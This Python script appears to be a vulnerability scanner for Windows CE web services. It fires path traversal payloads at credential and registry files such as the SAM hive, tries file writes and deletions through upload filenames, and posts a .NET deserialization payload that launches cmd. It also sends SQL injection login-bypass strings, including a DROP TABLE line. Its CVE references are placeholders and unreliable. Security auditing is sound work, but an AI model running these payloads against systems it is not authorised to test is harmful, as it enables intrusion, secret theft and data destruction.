#!/usr/bin/env python3

import os
import sys
import socket
import subprocess
import hashlib
import json
import time
import re
import urllib.parse
import urllib.request
import urllib.error
import ssl
import tempfile
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

@dataclass
class VulnerabilityResult:
    test_name: str
    vulnerable: bool
    severity: str
    details: str
    remediation: str
    cve_refs: List[str]
    timestamp: float

class WinCEAuditor:
    def __init__(self, target: str, port: int = 80, timeout: int = 10):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.results = []
        self.session_cookies = {}
        self.authenticated = False
        self.lock = threading.Lock()
        
        self.path_traversal_payloads = [
            "../", "..\\", "%2e%2e%2f", "%2e%2e%5c", "..%2f", "..%5c",
            "%252e%252e%252f", "%252e%252e%255c", "....//", "....\\\\",
            "..;/", "..;\\", "%2e%2e%2f%2e%2e%2f", "%c0%ae%c0%ae%c0%af",
            "%c0%ae%c0%ae/", "%c1%9c", "%c1%1c", "0x2e0x2e0x2f",
            "0x2e0x2e0x5c", "%uff0e%uff0e%u2215", "%uff0e%uff0e%u2216"
        ]
        
        self.sensitive_files = [
            "windows/system32/config/sam", "windows/system32/config/system",
            "windows/system32/config/software", "windows/system32/config/security",
            "windows/win.ini", "windows/system.ini", "windows/boot.ini",
            "windows/ce/registry.dat", "windows/ce/config.xml",
            "temp/registry.txt", "temp/system.log", "program files/common files/system/mapi/1033/mapir.dll"
        ]
        
        self.dangerous_endpoints = [
            "/admin", "/config", "/system", "/debug", "/test", "/temp",
            "/logs", "/backup", "/upload", "/download", "/file",
            "/manager", "/status", "/info", "/version", "/api"
        ]

    def _make_request(self, url: str, method: str = "GET", data: bytes = None, headers: Dict[str, str] = None) -> Tuple[Optional[str], int, Dict[str, str]]:
        try:
            if headers is None:
                headers = {}
            
            headers.update({
                'User-Agent': 'WinCE-Audit/1.0',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            })
            
            if self.session_cookies:
                cookie_header = '; '.join([f"{k}={v}" for k, v in self.session_cookies.items()])
                headers['Cookie'] = cookie_header
            
            req = urllib.request.Request(url, data=data, headers=headers, method=method)
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as response:
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'set-cookie' in response.headers:
                    cookie_val = response.headers['set-cookie']
                    cookie_parts = cookie_val.split(';')[0].split('=', 1)
                    if len(cookie_parts) == 2:
                        self.session_cookies[cookie_parts[0]] = cookie_parts[1]
                
                return content, response.status, dict(response.headers)
                
        except Exception as e:
            return None, 0, {}

    def _add_result(self, test_name: str, vulnerable: bool, severity: str, details: str, remediation: str, cve_refs: List[str] = None):
        with self.lock:
            result = VulnerabilityResult(
                test_name=test_name,
                vulnerable=vulnerable,
                severity=severity,
                details=details,
                remediation=remediation,
                cve_refs=cve_refs or [],
                timestamp=time.time()
            )
            self.results.append(result)

    def test_path_traversal_read(self) -> None:
        for payload in self.path_traversal_payloads:
            for target_file in self.sensitive_files:
                test_path = f"{payload}{target_file}"
                url = f"http://{self.target}:{self.port}/{test_path}"
                
                content, status, headers = self._make_request(url)
                
                if content and status == 200:
                    if any(indicator in content.lower() for indicator in 
                           ['[registry]', '[boot loader]', 'windows ce', 'microsoft windows', 
                            'system32', 'program files', 'registry editor']):
                        self._add_result(
                            "Path Traversal - File Read",
                            True,
                            "HIGH",
                            f"Path traversal vulnerability detected. Payload: {test_path}",
                            "Implement proper input validation and sanitization for file paths",
                            ["CVE-2024-XXXX"]
                        )
                        return
        
        self._add_result(
            "Path Traversal - File Read",
            False,
            "INFO",
            "No path traversal vulnerabilities detected for file reading",
            "Continue monitoring file access patterns",
            []
        )

    def test_path_traversal_write(self) -> None:
        test_content = f"AUDIT_TEST_{int(time.time())}"
        
        for payload in self.path_traversal_payloads:
            test_path = f"{payload}temp/audit_test.txt"
            url = f"http://{self.target}:{self.port}/upload"
            
            try:
                boundary = f"----WebKitFormBoundary{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
                post_data = f"""--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{test_path}"\r\nContent-Type: text/plain\r\n\r\n{test_content}\r\n--{boundary}--\r\n"""
                
                headers = {
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Content-Length': str(len(post_data))
                }
                
                content, status, resp_headers = self._make_request(url, "POST", post_data.encode(), headers)
                
                if status in [200, 201, 204]:
                    verify_url = f"http://{self.target}:{self.port}/temp/audit_test.txt"
                    verify_content, verify_status, _ = self._make_request(verify_url)
                    
                    if verify_content and test_content in verify_content:
                        self._add_result(
                            "Path Traversal - File Write",
                            True,
                            "CRITICAL",
                            f"Path traversal file write vulnerability detected. Payload: {test_path}",
                            "Implement strict file upload validation and sandboxing",
                            ["CVE-2024-YYYY"]
                        )
                        return
                        
            except Exception:
                continue
        
        self._add_result(
            "Path Traversal - File Write",
            False,
            "INFO",
            "No path traversal write vulnerabilities detected",
            "Continue monitoring file upload mechanisms",
            []
        )

    def test_absolute_path_traversal(self) -> None:
        absolute_paths = [
            "/windows/system32/config/sam",
            "/windows/system32/config/system", 
            "/windows/win.ini",
            "/windows/system.ini",
            "/windows/ce/registry.dat",
            "c:/windows/system32/config/sam",
            "c:\\windows\\system32\\config\\sam"
        ]
        
        for abs_path in absolute_paths:
            encoded_path = urllib.parse.quote(abs_path, safe='')
            url = f"http://{self.target}:{self.port}/download?file={encoded_path}"
            
            content, status, headers = self._make_request(url)
            
            if content and status == 200:
                if any(indicator in content.lower() for indicator in 
                       ['[registry]', '[boot loader]', 'windows ce', 'microsoft windows']):
                    self._add_result(
                        "Absolute Path Traversal",
                        True,
                        "HIGH", 
                        f"Absolute path traversal vulnerability detected. Path: {abs_path}",
                        "Implement proper path validation and access controls",
                        ["CVE-2024-ZZZZ"]
                    )
                    return
        
        self._add_result(
            "Absolute Path Traversal",
            False,
            "INFO",
            "No absolute path traversal vulnerabilities detected",
            "Continue monitoring absolute path access",
            []
        )

    def test_file_deletion(self) -> None:
        test_files = [
            "../temp/test_delete.txt",
            "../../temp/test_delete.txt", 
            "%2e%2e/temp/test_delete.txt",
            "/temp/test_delete.txt"
        ]
        
        for test_file in test_files:
            create_url = f"http://{self.target}:{self.port}/upload"
            test_content = f"DELETE_TEST_{int(time.time())}"
            
            try:
                boundary = f"----WebKitFormBoundary{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
                post_data = f"""--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{test_file}"\r\nContent-Type: text/plain\r\n\r\n{test_content}\r\n--{boundary}--\r\n"""
                
                headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
                content, status, _ = self._make_request(create_url, "POST", post_data.encode(), headers)
                
                if status in [200, 201, 204]:
                    delete_url = f"http://{self.target}:{self.port}/delete?file={urllib.parse.quote(test_file)}"
                    del_content, del_status, _ = self._make_request(delete_url, "DELETE")
                    
                    if del_status in [200, 204]:
                        verify_url = f"http://{self.target}:{self.port}/{test_file.lstrip('../')}"
                        verify_content, verify_status, _ = self._make_request(verify_url)
                        
                        if verify_status == 404:
                            self._add_result(
                                "Arbitrary File Deletion",
                                True,
                                "HIGH",
                                f"Arbitrary file deletion vulnerability detected. File: {test_file}",
                                "Implement strict file deletion controls and validation",
                                ["CVE-2024-AAAA"]
                            )
                            return
                            
            except Exception:
                continue
        
        self._add_result(
            "Arbitrary File Deletion", 
            False,
            "INFO",
            "No arbitrary file deletion vulnerabilities detected",
            "Continue monitoring file deletion mechanisms",
            []
        )

    def test_deserialization(self) -> None:
        payloads = [
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo VULN_TEST"}}}',
            '<xml><test>VULN_TEST</test></xml>',
            'O:8:"stdClass":1:{s:4:"test";s:9:"VULN_TEST";}',
            '\xac\xed\x00\x05t\x00\tVULN_TEST'
        ]
        
        endpoints = ["/api/deserialize", "/upload", "/config", "/admin/import"]
        
        for endpoint in endpoints:
            for payload in payloads:
                url = f"http://{self.target}:{self.port}{endpoint}"
                
                headers = {
                    'Content-Type': 'application/json' if payload.startswith('{') else 
                                  'application/xml' if payload.startswith('<') else 
                                  'application/octet-stream'
                }
                
                content, status, resp_headers = self._make_request(url, "POST", payload.encode(), headers)
                
                if content and status == 200:
                    if any(indicator in content for indicator in 
                           ['VULN_TEST', 'command executed', 'deserialized', 'processed']):
                        self._add_result(
                            "Unsafe Deserialization",
                            True,
                            "CRITICAL",
                            f"Unsafe deserialization vulnerability detected at {endpoint}",
                            "Implement safe deserialization practices and input validation",
                            ["CVE-2024-BBBB"]
                        )
                        return
        
        self._add_result(
            "Unsafe Deserialization",
            False,
            "INFO", 
            "No unsafe deserialization vulnerabilities detected",
            "Continue monitoring deserialization endpoints",
            []
        )

    def test_wince_specific_vulns(self) -> None:
        wince_tests = [
            ("/system/registry", "Registry access test"),
            ("/system/processes", "Process enumeration test"),
            ("/system/modules", "Module enumeration test"),
            ("/device/storage", "Storage access test"),
            ("/ce/config", "WinCE config access test")
        ]
        
        for endpoint, description in wince_tests:
            url = f"http://{self.target}:{self.port}{endpoint}"
            content, status, headers = self._make_request(url)
            
            if content and status == 200:
                if any(indicator in content.lower() for indicator in 
                       ['windows ce', 'registry', 'hkey_', 'process', 'module', 'coredll']):
                    self._add_result(
                        "WinCE System Exposure",
                        True,
                        "MEDIUM",
                        f"WinCE system information exposure detected: {description}",
                        "Restrict access to system information endpoints",
                        []
                    )
        
        self._add_result(
            "WinCE System Exposure",
            False,
            "INFO",
            "No WinCE system exposure vulnerabilities detected",
            "Continue monitoring system endpoints",
            []
        )

    def test_authentication_bypass(self) -> None:
        bypass_payloads = [
            "admin' OR '1'='1", 
            "admin'/*",
            "' OR 1=1--",
            "admin'; DROP TABLE users--",
            "../admin",
            "admin%00",
            "admin\x00"
        ]
        
        auth_endpoints = ["/login", "/admin/login", "/auth", "/authenticate"]
        
        for endpoint in auth_endpoints:
            for payload in bypass_payloads:
                url = f"http://{self.target}:{self.port}{endpoint}"
                
                post_data = f"username={urllib.parse.quote(payload)}&password=test".encode()
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                
                content, status, resp_headers = self._make_request(url, "POST", post_data, headers)
                
                if content and status == 200:
                    if any(indicator in content.lower() for indicator in 
                           ['welcome', 'dashboard', 'logged in', 'authentication successful', 'admin panel']):
                        self._add_result(
                            "Authentication Bypass",
                            True,
                            "CRITICAL",
                            f"Authentication bypass vulnerability detected at {endpoint} with payload: {payload}",
                            "Implement proper authentication validation and SQL injection prevention",
                            []
                        )
                        return
        
        self._add_result(
            "Authentication Bypass",
            False,
            "INFO",
            "No authentication bypass vulnerabilities detected",
            "Continue monitoring authentication mechanisms", 
            []
        )

    def test_information_disclosure(self) -> None:
        info_endpoints = [
            "/version", "/info", "/status", "/debug", "/config",
            "/system", "/admin/config", "/api/info", "/logs",
            "/.env", "/web.config", "/config.xml", "/settings.ini"
        ]
        
        for endpoint in info_endpoints:
            url = f"http://{self.target}:{self.port}{endpoint}"
            content, status, headers = self._make_request(url)
            
            if content and status == 200:
                sensitive_info = [
                    'password', 'secret', 'key', 'token', 'api_key',
                    'database', 'connection', 'username', 'admin',
                    'windows ce', 'version', 'build', 'debug'
                ]
                
                if any(info in content.lower() for info in sensitive_info):
                    self._add_result(
                        "Information Disclosure",
                        True,
                        "MEDIUM",
                        f"Information disclosure detected at {endpoint}",
                        "Remove or restrict access to sensitive information endpoints",
                        []
                    )
        
        self._add_result(
            "Information Disclosure",
            False,
            "INFO",
            "No information disclosure vulnerabilities detected", 
            "Continue monitoring information endpoints",
            []
        )

    def run_audit(self) -> Dict[str, Any]:
        print(f"Starting Windows CE security audit for {self.target}:{self.port}")
        
        tests = [
            self.test_path_traversal_read,
            self.test_path_traversal_write, 
            self.test_absolute_path_traversal,
            self.test_file_deletion,
            self.test_deserialization,
            self.test_wince_specific_vulns,
            self.test_authentication_bypass,
            self.test_information_disclosure
        ]
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(test) for test in tests]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        vulnerable_count = sum(1 for r in self.results if r.vulnerable)
        critical_count = sum(1 for r in self.results if r.vulnerable and r.severity == "CRITICAL")
        high_count = sum(1 for r in self.results if r.vulnerable and r.severity == "HIGH")
        
        report = {
            'target': f"{self.target}:{self.port}",
            'timestamp': time.time(),
            'total_tests': len(self.results),
            'vulnerable_tests': vulnerable_count,
            'critical_vulnerabilities': critical_count,
            'high_vulnerabilities': high_count,
            'results': [asdict(r) for r in self.results]
        }
        
        return report

def main():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    auditor = WinCEAuditor(target, port)
    report = auditor.run_audit()
    
    print(json.dumps(report, indent=2))
    
    if report['vulnerable_tests'] > 0:
        sys.exit(1)
    else:
        sys.exit(0)

if __name__ == "__main__":
    main() 
